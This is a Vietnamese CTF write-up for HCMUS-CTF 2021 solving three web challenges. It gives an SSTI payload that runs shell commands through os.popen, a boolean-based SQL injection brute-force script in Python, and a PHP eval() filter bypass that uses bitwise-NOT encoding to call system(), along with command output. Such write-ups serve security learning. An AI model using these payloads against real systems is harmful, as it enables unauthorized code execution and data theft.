# WRITE-UP-HCMUS-CTF-2021
## 1. Nothingness
+ Nhập thử bậy bạ 1 số đường dẫn lên thanh url thì ta thấy trang web in ra dòng trạng thái vô cùng đáng ghét:
> Sorry /index is under construction. Please try again later
+ Chúng in ra đường dẫn mà ta vừa nhập vào -> nghi ngờ XSS, SSTI
+ Ban đầu mình nghi ngờ là XSS nhưng lại không biết lấy gì trong trang web này. May mắn mình được một người bạn giúp đỡ gợi ý cho mình là SSTI.
+ Thử nhập <pre><code>{{7*7}}</code></pre> thì quả đúng là nó in ra 49
+ Tìm cách điều khiển nó thoi. Mình tìm được 1 payload để rce nó: <pre><code>{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}</code></pre>
+ ls ra 1 thư mục nữa thì thấy có file 'flag_HKOOS2lrdD'
+ Submit flag thôi: HCMUS-CTF{404_teMpl4t3_1njEctIon}

##2. EasyLogin
+ Đọc đề bài và vào trang web thì 99.99% là SQLi rồi. Thử đăng nhập vào thì ta nhận được
> Nothing special here. Maybe an admin account will work?
+ Tìm cách đăng nhập admin. Thử <pre><code>admin' or 1=1--</code></pre> Thì ta nhận được được Nothing special
+ Order by thì biết được là SQLite3 và bảng này gồm 2 cột mình 
+ Thử union select 'admin', 2 Thì trang web trả về một tấm hình khá ức chế và 1 câu:
> Well done login as admin, but the flag is in another castle
+ Thế là mình bế tắt 1 thời gian khá dài cho đến khi để ý trong hình có 1 dòng: 'Doing the same thing over and over and expecting a different result'. Dịch đại khái là làm thật nhiều lần và nhận được kết quả khác nhau -> Bruteforce. Mình thử <pre><code>admin' or 1=2--</code></pre> thì nó vẫn ra tấm hình ban nãy -> Nếu đúng thì 'Nothing special' sai thì 'Well done'. Mình và 1 vài người bạn của mình viết 1 đoạn code để bruteforce dựa trên ý tưởng đó để bruteforce tên bảng trước
<pre><code>
tbl_name = 'CREATE TABLE flagtablewithrandomname'
tbl = 'users, flagtablewithrandomname1'
sql = 'CREATE TABLE user(username, passw'
sql2 = ''
flag = ''
for i in range(1,50):
    for j in range(32,127):
        print(f"i\t\t{i}\t\t{j}",end='\r')
        resp = requests.post(url, data={
            "username": f"admin' or (select substr(flag,{i},1) FROM flagtablewithrandomname)=char({j})--",
            "passwd": "guest"
        })
        # print(resp.text)
        if "Nothing" in resp.text:
            flag += chr(j)
            print(f"tbl_name = {flag}")
            break 
</code></pre>
May mắn là tìm ra ngay flag lun:
+ ![image](https://user-images.githubusercontent.com/58381595/119288538-eccbb980-bc72-11eb-8b1f-e5d5e9401237.png)

# 3. SimpleCalculator
+ Nghe tên bài và vào xem thì khá quen -> chắc là dùng PHP eval() để thực hiện lệnh
+ Nhập thử chữ thì -> 'Mày không thoát được đâu con trai to be counted' (Khá cay :( ) và hint:
> Alphabetic character and quote is not allowed here
+ Mình nghĩ ngay tới WAF bypass. Nhưng dù có search google thế nào cũm bị giới hạn kí tự và chặn mất quote
+ Hơn 1 ngày suy nghĩ thì mình nhận được 1 hint là '~'. Là gì? Search google một hồi thì biết được đó là đảo bit trong php
+ ![image](https://user-images.githubusercontent.com/58381595/119289646-2a314680-bc75-11eb-9e46-b204ac314818.png)
+ Vậy nếu ta đảo ngược lại lần nữa ko phải là sẽ về chuỗi cũ sao. Thử đảo phpinfo thành ' %8F%97%8F%96%91%99%90 ' rồi gửi ' (~%8F%97%8F%96%91%99%90)() ' Thì quả thật lệnh phpinfo() đã được thực hiện
+ system('ls -l') xem có gì nào : (~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D2%93)
> Warning: Use of undefined constant ���ғ - assumed '���ғ' (this will throw an Error in a future version of PHP) in /var/www/html/index.php(21) : eval()'d code on line 1
total 4 -rwxrw-r--. 1 www-data root 856 May 18 11:52 index.php drwxr-xr-x. 1 www-data root 23 May 18 11:52 static drwxr-xr-x. 1 www-data root 23 May 18 11:52 static
+ Ra ngoài gốc lun xem có gì
> Warning: Use of undefined constant ���ғ�� - assumed '���ғ��' (this will throw an Error in a future version of PHP) in /var/www/html/index.php(21) : eval()'d code on line 1
total 4 drwxr-xr-x. 1 root root 28 May 12 12:48 bin drwxr-xr-x. 2 root root 6 Mar 19 23:44 boot drwxr-xr-x. 5 root root 360 May 23 13:13 dev drwxr-xr-x. 1 root root 66 May 23 13:13 etc -rwxrw-r--. 1 root root 25 May 18 11:52 fl4ggggH3reeeeeeeeeee drwxr-xr-x. 2 root root 6 Mar 19 23:44 home drwxr-xr-x. 1 root root 21 May 12 12:48 lib drwxr-xr-x. 2 root root 34 May 11 00:00 lib64 drwxr-xr-x. 2 root root 6 May 11 00:00 media drwxr-xr-x. 2 root root 6 May 11 00:00 mnt drwxr-xr-x. 2 root root 6 May 11 00:00 opt dr-xr-xr-x. 580 root root 0 May 23 13:13 proc drwx------. 1 root root 6 May 12 13:41 root drwxr-xr-x. 1 root root 36 May 23 13:13 run drwxr-xr-x. 1 root root 20 May 12 12:48 sbin drwxr-xr-x. 2 root root 6 May 11 00:00 srv dr-xr-xr-x. 13 root root 0 May 11 11:41 sys drwxrwxrwt. 1 root root 6 May 12 13:41 tmp drwxr-xr-x. 1 root root 19 May 11 00:00 usr drwxr-xr-x. 1 root root 17 May 12 12:43 var drwxr-xr-x. 1 root root 17 May 12 12:43 var
+ cat flag thui: system('nl /*') -> HCMUS-CTF{d4ngErous_eVal}
